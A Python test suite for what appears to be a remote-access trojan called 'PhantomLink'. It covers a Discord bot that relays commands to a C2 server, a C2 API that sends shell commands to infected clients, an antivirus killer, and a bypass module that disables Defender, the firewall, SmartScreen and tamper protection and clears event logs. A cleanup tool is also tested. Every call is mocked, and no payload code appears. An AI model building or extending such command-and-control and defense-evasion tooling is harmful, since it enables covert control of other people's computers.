import io
import json
import os
import sys
import unittest
import urllib.error
from pathlib import Path
from unittest.mock import MagicMock, patch

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))


class DiscordBotCommandsIntegrationTests(unittest.TestCase):
    """Integration & E2E tests for all Discord Bot commands across Happy Path, Malformed Input, & Failure Mode."""

    def test_discord_simple_commands_happy_path(self):
        import discord_bot

        for cmd_name, cmd_info in discord_bot.SIMPLE_COMMANDS.items():
            commands = cmd_info.get("commands", [])
            self.assertTrue(len(commands) > 0, f"Simple command !{cmd_name} missing command list")
            for sub_cmd in commands:
                self.assertIsInstance(sub_cmd, str)

    def test_discord_param_commands_happy_path(self):
        import discord_bot

        test_params = {
            "camera": "Integrated Webcam",
            "alert": "Warning Message",
            "wallpaper": r"C:\Windows\Web\Wallpaper\Theme1\img1.jpg",
            "rotate": "up",
            "type": "Hello World",
            "hide": r"C:\Users\Public\secret.txt",
        }

        for cmd_name, param in test_params.items():
            cmd_info = discord_bot.PARAM_COMMANDS[cmd_name]
            builder = cmd_info["build"]
            cmds = builder(param)
            cmds = [c for c in cmds if c is not None]
            self.assertTrue(len(cmds) > 0, f"Param command !{cmd_name} built empty command list")

    def test_discord_param_commands_malformed_input(self):
        import discord_bot

        # Test invalid rotate direction
        rotate_builder = discord_bot.PARAM_COMMANDS["rotate"]["build"]
        invalid_cmds = [c for c in rotate_builder("diagonal") if c is not None]
        self.assertEqual(len(invalid_cmds), 0, "Invalid rotate direction should yield empty commands")

        # Test empty alert payload
        alert_builder = discord_bot.PARAM_COMMANDS["alert"]["build"]
        cmds = alert_builder("")
        self.assertEqual(len(cmds), 1)

    def test_discord_bot_c2_failure_mode(self):
        import discord_bot

        with patch("urllib.request.urlopen", side_effect=urllib.error.URLError("Connection Refused")):
            res = discord_bot._send_commands_sync(["dir"])
            self.assertIn("C2 Server ไม่ได้เปิดอยู่", res)

    def test_discord_bot_c2_timeout_mode(self):
        import discord_bot

        with patch("discord_bot._check_c2_server", return_value=True):
            with patch("urllib.request.urlopen", side_effect=urllib.error.URLError("Timed out")):
                res = discord_bot._send_commands_sync(["dir"])
                self.assertIn("C2 Server connection error", res)


class C2APICommandsIntegrationTests(unittest.TestCase):
    """Integration & E2E tests for C2 API endpoints across Happy Path, Malformed Input, & Failure Mode."""

    def setUp(self):
        from C2.C2 import C2APIHandler, ClientManager

        self.manager = ClientManager()
        self.handler = C2APIHandler.__new__(C2APIHandler)
        self.handler.client_manager = self.manager
        self.handler._check_auth = MagicMock(return_value=True)
        self.handler._set_headers = MagicMock()
        self.handler.wfile = io.BytesIO()

    def test_c2_api_status_happy_path(self):
        self.handler.path = "/api/status"
        self.handler.do_GET()
        output = json.loads(self.handler.wfile.getvalue().decode())
        self.assertEqual(output.get("status"), "ok")

    def test_c2_api_clients_happy_path(self):
        mock_conn = MagicMock()
        self.manager._recv_message = MagicMock(side_effect=[b"PhantomLink", b"ClientOne"])
        cid = self.manager.add_client(mock_conn, ("192.168.1.50", 44444))

        self.handler.path = "/api/clients"
        self.handler.wfile = io.BytesIO()
        self.handler.do_GET()
        output = json.loads(self.handler.wfile.getvalue().decode())
        self.assertIn("clients", output)
        self.assertEqual(len(output["clients"]), 1)
        self.assertEqual(output["clients"][0]["id"], cid)

    def test_c2_api_command_happy_path(self):
        mock_conn = MagicMock()
        self.manager._recv_message = MagicMock(side_effect=[b"PhantomLink", b"ClientOne"])
        cid = self.manager.add_client(mock_conn, ("192.168.1.50", 44444))

        self.manager._send_message = MagicMock(return_value=True)
        self.manager._recv_message = MagicMock(return_value=b"Command Output Result")

        post_payload = json.dumps({"command": "whoami", "target": str(cid)}).encode("utf-8")
        self.handler.path = "/api/command"
        self.handler.headers = {"Content-Length": str(len(post_payload))}
        self.handler.rfile = io.BytesIO(post_payload)
        self.handler.wfile = io.BytesIO()

        self.handler.do_POST()
        output = json.loads(self.handler.wfile.getvalue().decode())
        self.assertIn("results", output)
        self.assertEqual(output["results"][0]["status"], "success")

    def test_c2_api_command_malformed_json_input(self):
        bad_payload = b"{malformed_json:"
        self.handler.path = "/api/command"
        self.handler.headers = {"Content-Length": str(len(bad_payload))}
        self.handler.rfile = io.BytesIO(bad_payload)
        self.handler.wfile = io.BytesIO()

        self.handler.do_POST()
        self.handler._set_headers.assert_called_with(500)

    def test_c2_api_command_missing_command_field(self):
        bad_payload = json.dumps({"target": "all"}).encode("utf-8")
        self.handler.path = "/api/command"
        self.handler.headers = {"Content-Length": str(len(bad_payload))}
        self.handler.rfile = io.BytesIO(bad_payload)
        self.handler.wfile = io.BytesIO()

        self.handler.do_POST()
        self.handler._set_headers.assert_called_with(400)
        output = json.loads(self.handler.wfile.getvalue().decode())
        self.assertEqual(output.get("error"), "Missing command")

    def test_c2_api_command_invalid_content_length(self):
        self.handler.path = "/api/command"
        self.handler.headers = {"Content-Length": "not_an_int"}
        self.handler.wfile = io.BytesIO()

        self.handler.do_POST()
        self.handler._set_headers.assert_called_with(400)
        output = json.loads(self.handler.wfile.getvalue().decode())
        self.assertIn("Invalid Content-Length", output.get("error", ""))

    def test_c2_api_unauthorized_failure_mode(self):
        from C2.C2 import C2APIHandler

        handler = C2APIHandler.__new__(C2APIHandler)
        handler.headers = {"X-API-Key": "WRONG_KEY"}
        handler.path = "/api/status"
        handler._set_headers = MagicMock()
        handler.wfile = io.BytesIO()

        res = handler.do_GET()
        self.assertFalse(res)


class ClientExecutionCommandsIntegrationTests(unittest.TestCase):
    """Integration & E2E tests for Client shell commands & modules."""

    def test_client_shell_execute_command_happy_path(self):
        from client.PhantomLink import ShellClient

        client = ShellClient()
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="desktop-user\n", stderr="", returncode=0)
            res = client.execute_command("whoami")
            self.assertIn("desktop-user", res)

    def test_client_shell_execute_command_cd_happy_path(self):
        from client.PhantomLink import ShellClient

        client = ShellClient()
        with patch("os.chdir") as mock_chdir:
            with patch("os.getcwd", return_value=r"C:\Windows\System32"):
                res = client.execute_command(r"cd C:\Windows\System32")
                self.assertIn("Changed directory to", res)

    def test_client_shell_execute_command_cd_failure_mode(self):
        from client.PhantomLink import ShellClient

        client = ShellClient()
        with patch("os.chdir", side_effect=PermissionError("Access denied")):
            res = client.execute_command(r"cd C:\Protected")
            self.assertIn("Failed to change directory", res)

    def test_client_shell_execute_command_malformed_exit(self):
        from client.PhantomLink import ShellClient

        client = ShellClient()
        res = client.execute_command("exit")
        self.assertTrue(client.should_exit)
        self.assertIn("Exiting...", res)

    def test_client_av_killer_scan_and_kill(self):
        from client.av_killer import AVKiller

        killer = AVKiller()
        with patch("subprocess.run") as mock_run:
            # Simulate no AV running
            mock_run.return_value = MagicMock(returncode=1)
            killed = killer.scan_and_kill()
            self.assertEqual(killed, [])

    def test_client_av_bypass_methods(self):
        from client.av_bypass import AVBypass

        bypass = AVBypass()
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            bypass.disable_defender()
            bypass.add_exclusions()
            bypass.disable_firewall()
            bypass.disable_smartscreen()
            bypass.disable_tamper_protection()
            bypass.clear_event_logs()
            self.assertTrue(mock_run.called)


class AntiPhantomRemoverCommandsIntegrationTests(unittest.TestCase):
    """Integration & E2E tests for Anti-Phantom remover steps."""

    def test_anti_phantom_remover_full_flow_dry_run(self):
        from anti_phantom.remover import PhantomLinkRemover

        remover = PhantomLinkRemover()
        with patch("psutil.process_iter", return_value=[]):
            remover.kill_suspicious_processes()
            self.assertIn("No suspicious processes found", remover.removed_items)

        with patch("os.path.exists", return_value=True):
            with patch("builtins.open", unittest.mock.mock_open(read_data="127.0.0.1 localhost\n")):
                remover.clean_hosts_file()
                self.assertIn("Hosts file is clean", remover.removed_items)


if __name__ == "__main__":
    unittest.main()
